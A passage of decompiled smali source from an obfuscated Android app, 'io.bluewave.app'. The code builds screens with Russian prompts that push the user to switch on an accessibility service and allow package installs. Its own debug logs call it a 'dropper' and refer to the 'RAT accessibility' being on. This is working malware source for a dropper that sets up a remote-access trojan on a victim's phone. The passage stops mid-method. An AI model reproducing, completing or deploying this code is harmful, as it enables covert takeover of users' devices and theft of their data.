    invoke-virtual {v0, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x1

    const-string v2, "2"

    invoke-virtual/range {v0 .. v5}, Lio/bluewave/app/MainActivity;->ECM0w2UpL85TD4rnc(Landroid/widget/LinearLayout;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    const v2, 0x7f0f00c9

    .line 306
    invoke-virtual {v0, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v3

    const v2, 0x7f0f00c8

    invoke-virtual {v0, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    const-string v2, "3"

    invoke-virtual/range {v0 .. v5}, Lio/bluewave/app/MainActivity;->ECM0w2UpL85TD4rnc(Landroid/widget/LinearLayout;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    .line 307
    invoke-virtual {v1, v11}, Landroid/view/View;->setTag(Ljava/lang/Object;)V

    invoke-virtual {v9, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 308
    invoke-virtual {v8, v9}, Landroid/widget/ScrollView;->addView(Landroid/view/View;)V

    .line 309
    new-instance v1, Landroid/widget/LinearLayout$LayoutParams;

    const/high16 v4, 0x3f800000    # 1.0f

    const/4 v5, -0x1

    const/4 v13, 0x0

    invoke-direct {v1, v5, v13, v4}, Landroid/widget/LinearLayout$LayoutParams;-><init>(IIF)V

    invoke-virtual {v7, v8, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 310
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    move-result-object v1

    const/16 v2, 0x12

    .line 311
    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    const/16 v4, 0xa

    invoke-virtual {v0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v5

    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v2

    const/16 v4, 0xe

    invoke-virtual {v0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v8

    invoke-virtual {v1, v3, v5, v2, v8}, Landroid/view/View;->setPadding(IIII)V

    .line 312
    new-instance v2, Landroid/view/View;

    invoke-direct {v2, v0}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    move/from16 v3, v16

    invoke-virtual {v2, v3}, Landroid/view/View;->setBackgroundColor(I)V

    .line 313
    new-instance v3, Landroid/widget/LinearLayout$LayoutParams;

    const/4 v5, -0x1

    const/4 v13, 0x1

    invoke-direct {v3, v5, v13}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    invoke-virtual {v1, v2, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 314
    new-instance v2, Landroid/widget/Button;

    invoke-direct {v2, v0}, Landroid/widget/Button;-><init>(Landroid/content/Context;)V

    iput-object v2, v0, Lio/bluewave/app/MainActivity;->WAxAMT28akcO:Landroid/widget/Button;

    const v3, 0x7f0f00c0

    .line 315
    invoke-virtual {v0, v3}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 316
    iget-object v2, v0, Lio/bluewave/app/MainActivity;->WAxAMT28akcO:Landroid/widget/Button;

    invoke-virtual {v2, v5}, Landroid/widget/TextView;->setTextColor(I)V

    .line 317
    iget-object v2, v0, Lio/bluewave/app/MainActivity;->WAxAMT28akcO:Landroid/widget/Button;

    const/high16 v3, 0x41600000    # 14.0f

    const/4 v4, 0x2

    invoke-virtual {v2, v4, v3}, Landroid/widget/TextView;->setTextSize(IF)V

    .line 318
    iget-object v2, v0, Lio/bluewave/app/MainActivity;->WAxAMT28akcO:Landroid/widget/Button;

    const-string v3, "sans-serif-medium"

    const/4 v5, 0x0

    invoke-static {v3, v5}, Landroid/graphics/Typeface;->create(Ljava/lang/String;I)Landroid/graphics/Typeface;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;)V

    .line 319
    iget-object v2, v0, Lio/bluewave/app/MainActivity;->WAxAMT28akcO:Landroid/widget/Button;

    invoke-virtual {v2, v5}, Landroid/widget/TextView;->setAllCaps(Z)V

    .line 320
    new-instance v2, Landroid/graphics/drawable/GradientDrawable;

    invoke-direct {v2}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    iget v3, v0, Lio/bluewave/app/MainActivity;->EYTN7lFEQxyK4y:I

    invoke-virtual {v2, v3}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    const/16 v3, 0x8

    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    int-to-float v3, v4

    invoke-virtual {v2, v3}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    .line 321
    iget-object v3, v0, Lio/bluewave/app/MainActivity;->WAxAMT28akcO:Landroid/widget/Button;

    invoke-virtual {v3, v2}, Landroid/view/View;->setBackground(Landroid/graphics/drawable/Drawable;)V

    iget-object v2, v0, Lio/bluewave/app/MainActivity;->WAxAMT28akcO:Landroid/widget/Button;

    const/4 v3, 0x2

    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    int-to-float v3, v4

    invoke-virtual {v2, v3}, Landroid/view/View;->setElevation(F)V

    iget-object v2, v0, Lio/bluewave/app/MainActivity;->WAxAMT28akcO:Landroid/widget/Button;

    const/4 v3, 0x0

    invoke-virtual {v2, v3}, Landroid/view/View;->setStateListAnimator(Landroid/animation/StateListAnimator;)V

    .line 322
    iget-object v2, v0, Lio/bluewave/app/MainActivity;->WAxAMT28akcO:Landroid/widget/Button;

    const/16 v4, 0x14

    invoke-virtual {v0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    const/16 v5, 0xc

    invoke-virtual {v0, v5}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v8

    invoke-virtual {v0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v4

    invoke-virtual {v0, v5}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v9

    invoke-virtual {v2, v3, v8, v4, v9}, Landroid/view/View;->setPadding(IIII)V

    .line 323
    iget-object v2, v0, Lio/bluewave/app/MainActivity;->WAxAMT28akcO:Landroid/widget/Button;

    new-instance v3, LU4clZ2NNNKj5ZWU/vpNdwwpwBwplN;

    const/4 v4, 0x0

    invoke-direct {v3, v0, v4}, LU4clZ2NNNKj5ZWU/vpNdwwpwBwplN;-><init>(Lio/bluewave/app/MainActivity;I)V

    invoke-virtual {v2, v3}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 324
    new-instance v2, Landroid/widget/LinearLayout$LayoutParams;

    const/4 v4, -0x2

    const/4 v5, -0x1

    invoke-direct {v2, v5, v4}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    const/16 v4, 0xa

    .line 325
    invoke-virtual {v0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    iput v3, v2, Landroid/widget/LinearLayout$LayoutParams;->topMargin:I

    .line 326
    iget-object v3, v0, Lio/bluewave/app/MainActivity;->WAxAMT28akcO:Landroid/widget/Button;

    invoke-virtual {v1, v3, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 327
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->vQMbLPlYT1awb32bcs()Landroid/widget/LinearLayout;

    move-result-object v2

    const/16 v3, 0x11

    invoke-virtual {v2, v3}, Landroid/widget/LinearLayout;->setGravity(I)V

    const/16 v3, 0x8

    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    const/4 v5, 0x0

    invoke-virtual {v2, v5, v3, v5, v5}, Landroid/view/View;->setPadding(IIII)V

    .line 328
    const-string v3, "\u2713 "

    invoke-virtual {v0, v3, v4, v10, v5}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const v3, 0x7f0f00b9

    .line 329
    invoke-virtual {v0, v3}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3, v4, v10, v5}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 330
    invoke-virtual {v1, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 331
    invoke-virtual {v7, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 332
    invoke-virtual {v6, v7}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 333
    iget-object v1, v0, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R:Landroid/widget/ViewFlipper;

    .line 334
    const-string v2, "#07080b"

    invoke-static {v2}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v2

    .line 335
    const-string v3, "#e8eaed"

    invoke-static {v3}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v3

    .line 336
    const-string v4, "#9aa0a6"

    invoke-static {v4}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v4

    .line 337
    const-string v5, "#1db954"

    invoke-static {v5}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v5

    .line 338
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    move-result-object v6

    .line 339
    invoke-virtual {v6, v2}, Landroid/view/View;->setBackgroundColor(I)V

    const/16 v2, 0x11

    .line 340
    invoke-virtual {v6, v2}, Landroid/widget/LinearLayout;->setGravity(I)V

    const/16 v2, 0x20

    .line 341
    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v7

    const/16 v8, 0x3c

    invoke-virtual {v0, v8}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v8

    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v9

    const/16 v2, 0x28

    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v10

    invoke-virtual {v6, v7, v8, v9, v10}, Landroid/view/View;->setPadding(IIII)V

    .line 342
    new-instance v2, Landroid/widget/ImageView;

    invoke-direct {v2, v0}, Landroid/widget/ImageView;-><init>(Landroid/content/Context;)V

    .line 343
    new-instance v7, LU4clZ2NNNKj5ZWU/n6vOQ2w2T3oBW;

    invoke-direct {v7, v5}, LU4clZ2NNNKj5ZWU/n6vOQ2w2T3oBW;-><init>(I)V

    invoke-virtual {v2, v7}, Landroid/widget/ImageView;->setImageDrawable(Landroid/graphics/drawable/Drawable;)V

    .line 344
    new-instance v7, Landroid/widget/LinearLayout$LayoutParams;

    const/16 v8, 0x50

    invoke-virtual {v0, v8}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v9

    invoke-virtual {v0, v8}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v8

    invoke-direct {v7, v9, v8}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    const/4 v13, 0x1

    .line 345
    iput v13, v7, Landroid/widget/LinearLayout$LayoutParams;->gravity:I

    const/16 v8, 0x1c

    .line 346
    invoke-virtual {v0, v8}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v8

    iput v8, v7, Landroid/widget/LinearLayout$LayoutParams;->bottomMargin:I

    .line 347
    invoke-virtual {v6, v2, v7}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    const v2, 0x7f0f001c

    .line 348
    invoke-virtual {v0, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v7

    const/16 v2, 0x16

    invoke-virtual {v0, v7, v2, v3, v13}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v2

    const/16 v3, 0x11

    .line 349
    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setGravity(I)V

    const/16 v7, 0xc

    .line 350
    invoke-virtual {v0, v7}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v8

    const/4 v13, 0x0

    invoke-static {v2, v13, v13, v13, v8}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    .line 351
    invoke-virtual {v6, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 352
    const-string v2, "\u0414\u043b\u044f \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0439 \u0440\u0430\u0431\u043e\u0442\u044b \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f\n\u043d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c\u043e \u0432\u043a\u043b\u044e\u0447\u0438\u0442\u044c \u0441\u043b\u0443\u0436\u0431\u0443 \u0441\u043f\u0435\u0446\u0438\u0430\u043b\u044c\u043d\u044b\u0445 \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u0435\u0439"

    const/16 v7, 0xe

    invoke-virtual {v0, v2, v7, v4, v13}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v2

    .line 353
    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setGravity(I)V

    .line 354
    invoke-virtual {v0, v15}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    int-to-float v3, v3

    const/high16 v7, 0x3f800000    # 1.0f

    invoke-virtual {v2, v3, v7}, Landroid/widget/TextView;->setLineSpacing(FF)V

    const/16 v3, 0x20

    .line 355
    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v7

    invoke-static {v2, v13, v13, v13, v7}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    .line 356
    invoke-virtual {v6, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 357
    new-instance v2, Landroid/widget/ProgressBar;

    invoke-direct {v2, v0}, Landroid/widget/ProgressBar;-><init>(Landroid/content/Context;)V

    .line 358
    new-instance v7, Landroid/widget/LinearLayout$LayoutParams;

    const/16 v8, 0x28

    invoke-virtual {v0, v8}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v9

    invoke-virtual {v0, v8}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v8

    invoke-direct {v7, v9, v8}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    const/4 v13, 0x1

    .line 359
    iput v13, v7, Landroid/widget/LinearLayout$LayoutParams;->gravity:I

    .line 360
    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v8

    iput v8, v7, Landroid/widget/LinearLayout$LayoutParams;->bottomMargin:I

    .line 361
    invoke-virtual {v6, v2, v7}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 362
    new-instance v2, Landroid/widget/Button;

    invoke-direct {v2, v0}, Landroid/widget/Button;-><init>(Landroid/content/Context;)V

    .line 363
    const-string v3, "\u0412\u043a\u043b\u044e\u0447\u0438\u0442\u044c"

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const/4 v3, -0x1

    .line 364
    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setTextColor(I)V

    const/high16 v3, 0x41700000    # 15.0f

    const/4 v7, 0x2

    .line 365
    invoke-virtual {v2, v7, v3}, Landroid/widget/TextView;->setTextSize(IF)V

    .line 366
    sget-object v3, Landroid/graphics/Typeface;->DEFAULT_BOLD:Landroid/graphics/Typeface;

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;)V

    const/4 v13, 0x0

    .line 367
    invoke-virtual {v2, v13}, Landroid/widget/TextView;->setAllCaps(Z)V

    .line 368
    new-instance v3, Landroid/graphics/drawable/GradientDrawable;

    invoke-direct {v3}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    .line 369
    invoke-virtual {v3, v5}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    const/16 v5, 0x18

    .line 370
    invoke-virtual {v0, v5}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v5

    int-to-float v5, v5

    invoke-virtual {v3, v5}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    .line 371
    invoke-virtual {v2, v3}, Landroid/view/View;->setBackground(Landroid/graphics/drawable/Drawable;)V

    const/16 v3, 0x20

    .line 372
    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v5

    const/16 v15, 0xe

    invoke-virtual {v0, v15}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v7

    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    invoke-virtual {v0, v15}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v8

    invoke-virtual {v2, v5, v7, v3, v8}, Landroid/view/View;->setPadding(IIII)V

    .line 373
    new-instance v3, LU4clZ2NNNKj5ZWU/vpNdwwpwBwplN;

    const/4 v5, 0x2

    invoke-direct {v3, v0, v5}, LU4clZ2NNNKj5ZWU/vpNdwwpwBwplN;-><init>(Lio/bluewave/app/MainActivity;I)V

    invoke-virtual {v2, v3}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 374
    new-instance v3, Landroid/widget/LinearLayout$LayoutParams;

    const/4 v5, -0x1

    const/4 v15, -0x2

    invoke-direct {v3, v5, v15}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    const/4 v13, 0x1

    .line 375
    iput v13, v3, Landroid/widget/LinearLayout$LayoutParams;->gravity:I

    .line 376
    invoke-virtual {v6, v2, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 377
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "\u041d\u0430\u0439\u0434\u0438\u0442\u0435 \""

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const v3, 0x7f0f001c

    invoke-virtual {v0, v3}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "\" \u0432 \u0441\u043f\u0438\u0441\u043a\u0435\n\u0438 \u0432\u043a\u043b\u044e\u0447\u0438\u0442\u0435 \u043f\u0435\u0440\u0435\u043a\u043b\u044e\u0447\u0430\u0442\u0435\u043b\u044c"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const/4 v5, 0x0

    const/16 v7, 0xc

    invoke-virtual {v0, v2, v7, v4, v5}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v2

    const/16 v3, 0x11

    .line 378
    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setGravity(I)V

    const/16 v3, 0x10

    .line 379
    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v3

    invoke-static {v2, v5, v3, v5, v5}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    .line 380
    invoke-virtual {v6, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 381
    invoke-virtual {v1, v6}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 382
    iget-object v1, v0, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R:Landroid/widget/ViewFlipper;

    invoke-virtual {v0, v1}, Landroid/app/Activity;->setContentView(Landroid/view/View;)V

    .line 383
    iget-object v1, v0, Lio/bluewave/app/MainActivity;->HrAWa37pvWeygr:Landroid/content/SharedPreferences;

    const-string v2, "pending_install"

    invoke-interface {v1, v2, v5}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v1

    if-eqz v1, :cond_9

    const/4 v3, 0x1

    .line 384
    iput-boolean v3, v0, Lio/bluewave/app/MainActivity;->vQMbLPlYT1awb32bcs:Z

    .line 385
    iget-object v1, v0, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R:Landroid/widget/ViewFlipper;

    invoke-virtual {v1, v3}, Landroid/widget/ViewAnimator;->setDisplayedChild(I)V

    goto :goto_5

    .line 386
    :cond_9
    new-instance v1, Ljava/lang/Thread;

    new-instance v2, LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;

    const/4 v3, 0x6

    invoke-direct {v2, v0, v3}, LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;-><init>(Lio/bluewave/app/MainActivity;I)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 387
    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    :goto_5
    return-void
.end method

.method public final onResume()V
    .locals 7

    .line 1
    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    .line 2
    .line 3
    .line 4
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 5
    .line 6
    .line 7
    move-result-object v0

    .line 8
    invoke-virtual {v0}, Landroid/content/pm/PackageManager;->canRequestPackageInstalls()Z

    .line 9
    .line 10
    .line 11
    move-result v0

    .line 12
    new-instance v1, Ljava/lang/StringBuilder;

    .line 13
    .line 14
    const-string v2, "onResume: pendingInstall="

    .line 15
    .line 16
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 17
    .line 18
    .line 19
    iget-boolean v2, p0, Lio/bluewave/app/MainActivity;->vQMbLPlYT1awb32bcs:Z

    .line 20
    .line 21
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    .line 22
    .line 23
    .line 24
    const-string v2, " installing="

    .line 25
    .line 26
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 27
    .line 28
    .line 29
    iget-boolean v2, p0, Lio/bluewave/app/MainActivity;->UgIxXQ6S7mmUt2naV:Z

    .line 30
    .line 31
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    .line 32
    .line 33
    .line 34
    const-string v2, " canInstall="

    .line 35
    .line 36
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 37
    .line 38
    .line 39
    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    .line 40
    .line 41
    .line 42
    const-string v2, " nagMode="

    .line 43
    .line 44
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 45
    .line 46
    .line 47
    iget-boolean v2, p0, Lio/bluewave/app/MainActivity;->EQ6go6jAtySCouhWhLsA:Z

    .line 48
    .line 49
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    .line 50
    .line 51
    .line 52
    const-string v2, " page="

    .line 53
    .line 54
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 55
    .line 56
    .line 57
    iget-object v2, p0, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R:Landroid/widget/ViewFlipper;

    .line 58
    .line 59
    invoke-virtual {v2}, Landroid/widget/ViewAnimator;->getDisplayedChild()I

    .line 60
    .line 61
    .line 62
    move-result v2

    .line 63
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 64
    .line 65
    .line 66
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 67
    .line 68
    .line 69
    move-result-object v1

    .line 70
    const-string v2, "DROPPER_DBG"

    .line 71
    .line 72
    invoke-static {v2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 73
    .line 74
    .line 75
    iget-object v1, p0, Lio/bluewave/app/MainActivity;->HrAWa37pvWeygr:Landroid/content/SharedPreferences;

    .line 76
    .line 77
    const-string v3, "rmxp"

    .line 78
    .line 79
    const/4 v4, 0x0

    .line 80
    invoke-interface {v1, v3, v4}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 81
    .line 82
    .line 83
    move-result v1

    .line 84
    const/4 v3, 0x1

    .line 85
    const/4 v5, 0x0

    .line 86
    const-string v6, "stwmk"

    .line 87
    .line 88
    if-eqz v1, :cond_1

    .line 89
    .line 90
    iget-object v0, p0, Lio/bluewave/app/MainActivity;->HrAWa37pvWeygr:Landroid/content/SharedPreferences;

    .line 91
    .line 92
    invoke-interface {v0, v6, v5}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 93
    .line 94
    .line 95
    move-result-object v0

    .line 96
    if-eqz v0, :cond_0

    .line 97
    .line 98
    invoke-virtual {p0, v0}, Lio/bluewave/app/MainActivity;->EQ6go6jAtySCouhWhLsA(Ljava/lang/String;)Z

    .line 99
    .line 100
    .line 101
    move-result v0

    .line 102
    if-eqz v0, :cond_0

    .line 103
    .line 104
    const-string v0, "onResume: RAT accessibility ON, finishing dropper"

    .line 105
    .line 106
    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 107
    .line 108
    .line 109
    invoke-virtual {p0}, Lio/bluewave/app/MainActivity;->EYTN7lFEQxyK4y()V

    .line 110
    .line 111
    .line 112
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    .line 113
    .line 114
    .line 115
    return-void

    .line 116
    :cond_0
    invoke-virtual {p0}, Lio/bluewave/app/MainActivity;->EYTN7lFEQxyK4y()V

    .line 117
    .line 118
    .line 119
    iput-boolean v3, p0, Lio/bluewave/app/MainActivity;->EQ6go6jAtySCouhWhLsA:Z

    .line 120
    .line 121
    iget-object v0, p0, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R:Landroid/widget/ViewFlipper;

    .line 122
    .line 123
    const/high16 v1, 0x10a0000

    .line 124
    .line 125
    invoke-virtual {v0, p0, v1}, Landroid/widget/ViewAnimator;->setInAnimation(Landroid/content/Context;I)V

    .line 126
    .line 127
    .line 128
    iget-object v0, p0, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R:Landroid/widget/ViewFlipper;

    .line 129
    .line 130
    const v1, 0x10a0001

    .line 131
    .line 132
    .line 133
    invoke-virtual {v0, p0, v1}, Landroid/widget/ViewAnimator;->setOutAnimation(Landroid/content/Context;I)V

    .line 134
    .line 135
    .line 136
    iget-object v0, p0, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R:Landroid/widget/ViewFlipper;

    .line 137
    .line 138
    const/4 v1, 0x3

    .line 139
    invoke-virtual {v0, v1}, Landroid/widget/ViewAnimator;->setDisplayedChild(I)V

    .line 140
    .line 141
    .line 142
    new-instance v0, LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;

    .line 143
    .line 144
    const/4 v1, 0x7

    .line 145
    invoke-direct {v0, p0, v1}, LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;-><init>(Lio/bluewave/app/MainActivity;I)V

    .line 146
    .line 147
    .line 148
    const-wide/16 v1, 0xbb8

    .line 149
    .line 150
    iget-object v3, p0, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW:Landroid/os/Handler;

    .line 151
    .line 152
    invoke-virtual {v3, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 153
    .line 154
    .line 155
    return-void

    .line 156
    :cond_1
    iget-boolean v1, p0, Lio/bluewave/app/MainActivity;->EQ6go6jAtySCouhWhLsA:Z

    .line 157
    .line 158
    if-eqz v1, :cond_2

    .line 159
    .line 160
